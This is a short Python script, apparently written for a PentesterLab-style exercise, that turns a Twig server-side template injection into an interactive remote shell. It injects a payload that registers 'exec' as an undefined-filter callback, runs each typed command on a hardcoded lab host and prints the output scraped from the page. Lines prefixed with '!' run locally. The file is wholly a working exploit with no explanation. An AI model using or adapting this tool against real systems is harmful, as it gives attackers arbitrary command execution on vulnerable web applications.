import requests
import os


class Injector:

	def __init__(self,url):
		self.url = url

	def makeRequest(self, param):
		url = self.url + param
		#print(url,"\n")
		response = requests.get(url)
		text = response.text.split("Hello")[1].split("</h1>")[0]
		return text

	def run(self, cmd):
		if(cmd[0]=='!'):
			print(os.system(cmd[1:]))
			return
		param = "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('" + cmd + "')}}"
		cmdOut = self.makeRequest(param)	
		print(cmdOut)

if __name__=="__main__":
	url = "http://ptl-eff86bbb-00f98bd9.libcurl.so/?name="
	injector = Injector(url)
	while(True):
		print("\nhoaxer > ", end="")
		cmd = input()
		if cmd.strip() == "":
			continue
		injector.run(cmd)
